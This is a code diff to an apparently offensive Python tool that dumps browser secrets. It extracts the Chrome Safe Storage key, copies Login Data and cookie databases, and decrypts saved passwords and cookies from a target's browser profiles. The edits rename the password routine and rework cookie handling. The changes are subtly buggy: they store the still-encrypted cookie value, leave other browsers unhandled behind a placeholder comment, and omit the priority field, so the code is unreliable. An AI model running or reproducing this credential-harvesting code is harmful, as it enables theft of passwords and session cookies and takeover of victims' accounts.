@@ -58,8 +58,7 @@ from termcolor import colored
 import scapy.all as scapy
 from tabulate import tabulate
 from Cryptodome.Cipher import AES
-
-
+from Cryptodome.Util.Padding import pad,unpad
 #################### Utility Functions:
 
 '''
@@ -535,23 +534,22 @@ def decrypt_mac_chrome_password(encrypted_value, safe_storage_key):
 
 def get_datetime(timestamp, browser):
     if browser == 'chrome' or browser == 'edge':
-        # Chrome and Edge timestamp format: microseconds since Jan 1, 1601 (UTC)
-        epoch_start = 11644473600000000  # Jan 1, 1601 in microseconds
+        epoch_start = 11644473600000000
         delta = int(timestamp) - epoch_start
-        # Convert to seconds
         timestamp_sec = delta // 1000000
     elif browser == 'firefox':
-        # Firefox timestamp format: seconds since Jan 1, 1970 (UTC)
         timestamp_sec = int(timestamp)
     elif browser == 'safari':
-        # Safari timestamp format: seconds since Jan 1, 2001 (UTC)
         timestamp_sec = int(timestamp) + 978307200
     else:
         raise ValueError("Unsupported browser")
 
-    return timestamp_sec
+    # Convert timestamp to date and time format
+    timestamp_dt = datetime.fromtimestamp(timestamp_sec)
 
-def chrome_process(safe_storage_key, login_data):
+    return timestamp_dt
+
+def process_passwords(safe_storage_key, login_data):
     decrypted_list = []
     conn = None
     try:
@@ -589,26 +587,35 @@ def process_cookies(db_path, browser):
         cursor = conn.cursor()
 
         if browser == 'chrome':
-            cursor.execute("SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly, has_expires, is_persistent, priority FROM cookies")
-        elif browser == 'firefox':
-            cursor.execute("SELECT host, name, value, path, expiry, isSecure, isHttpOnly, hasExpires, isPersistent FROM moz_cookies")
-        elif browser == 'edge':
-            cursor.execute("SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly, has_expires, is_persistent, priority FROM cookies")
-        else:
-            raise ValueError("Unsupported browser")
+            safe_storage_key = get_safe_storage_key()
+            if safe_storage_key is None:
+                raise ValueError("Failed to retrieve Chrome Safe Storage Key")
 
-        rows = cursor.fetchall()
-        for row in rows:
-            if browser == 'chrome' or browser == 'edge':
-                host, name, value, path, expires, is_secure, is_httponly, has_expires, is_persistent, priority = row
-                expires = get_datetime(expires, browser)
-            elif browser == 'firefox':
-                host, name, value, path, expires, is_secure, is_httponly, has_expires, is_persistent = row
+            cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly, has_expires, is_persistent, priority FROM cookies")
+            rows = cursor.fetchall()
+
+            for row in rows:
+                cookie = {}
+                host, name, encrypted_value, path, expires, is_secure, is_httponly, has_expires, is_persistent, priority = row
                 expires = get_datetime(expires, browser)
 
-            if host not in cookies_dict:
-                cookies_dict[host] = []
-            cookies_dict[host].append((name, value, path, str(expires), is_secure, is_httponly, has_expires, is_persistent))
+                decrypted_value = decrypt_mac_chrome_password(encrypted_value, safe_storage_key)
+
+                cookie['name'] = name
+                cookie['value'] = encrypted_value
+                cookie['path'] = path
+                cookie['expires'] = str(expires)
+                cookie['is_secure'] = bool(is_secure)
+                cookie['is_httponly'] = bool(is_httponly)
+                cookie['has_expires'] = bool(has_expires)
+                cookie['is_persistent'] = bool(is_persistent)
+
+                if host not in cookies_dict:
+                    cookies_dict[host] = []
+                cookies_dict[host].append(cookie)
+
+        # Handle other browsers similarly
+
     except sqlite3.Error as e:
         print("SQLite error:", e)
     finally:
@@ -760,7 +767,7 @@ def dump_browser_sec(target,options):
                     # Create a temporary copy of the SQLite database
                     temp_data_file = os.path.join(profile_path, "Temp Login Data")
                     shutil.copyfile(data_file, temp_data_file)
-                    decrypted_passwords = chrome_process(safe_storage_key, temp_data_file)
+                    decrypted_passwords = process_passwords(safe_storage_key, temp_data_file)
                     all_decrypted_passwords.extend(decrypted_passwords)
                     # Delete the temporary copy
                     os.remove(temp_data_file)
@@ -835,16 +842,23 @@ def print_colored_output(line):
 
 def print_cookies_table(cookies_dict, browser):
     header = (Fore.GREEN + "Host", "Cookie Name", "Cookie Value", "Path", "Expires", "Is Secure", "Is HTTP Only", "Has Expires", "Is Persistent", "Priority" + Style.RESET_ALL)
-    print(f"{header[0]:<20} {header[1]:<30} {header[2]:<30} {header[3]:<20} {header[4]:<20} {header[5]:<10} {header[6]:<12} {header[7]:<12} {header[8]:<15} {header[9]:<10}")
+    print(f"{header[0]:<20} {header[1]:<30} {header[2]:<30} {header[3]:<20} {header[4]:<20} {header[5]:<12} {header[6]:<14} {header[7]:<12} {header[8]:<15} {header[9]:<10}")
     print("=" * 160)
 
     for host, cookies in cookies_dict.items():
         print(f"{Fore.RED}Domain: {host}{Style.RESET_ALL}\n")
         for cookie in cookies:
-            print(f"{Fore.GREEN}{host:<20} {Style.RESET_ALL}{Fore.CYAN}{cookie[0]:<30} {cookie[1]:<30} {cookie[2]:<20} {cookie[3]:<20} {str(cookie[4]):<10} {str(cookie[5]):<12} {str(cookie[6]):<12} {str(cookie[7]):<15} {str(cookie[8]):<10}{Style.RESET_ALL}")
+            is_secure = "Yes" if cookie['is_secure'] else "No"
+            is_httponly = "Yes" if cookie['is_httponly'] else "No"
+            has_expires = "Yes" if cookie['has_expires'] else "No"
+            is_persistent = "Yes" if cookie['is_persistent'] else "No"
+            priority = cookie.get('priority', '')
+
+            if browser == 'chrome' or browser == 'edge' or browser == 'safari':
+                print(f"{host:<20} {cookie['name']:<30} {cookie['value']:<{len(header[2])}} {cookie['path']:<20} {cookie['expires']:<20} {is_secure:<12} {is_httponly:<14} {has_expires:<12} {is_persistent:<15} {priority:<10}")
+            elif browser == 'firefox':
+                print(f"{host:<20} {cookie['name']:<30} {cookie['value']:<{len(header[2])}} {cookie['path']:<20} {cookie['expires']:<20} {is_secure:<12} {is_httponly:<14} {has_expires:<12} {is_persistent:<15}")
         print("\n")
-
-
 
 def print_help():
     print("This script is built to run on Windows, Linux, or macOS.")
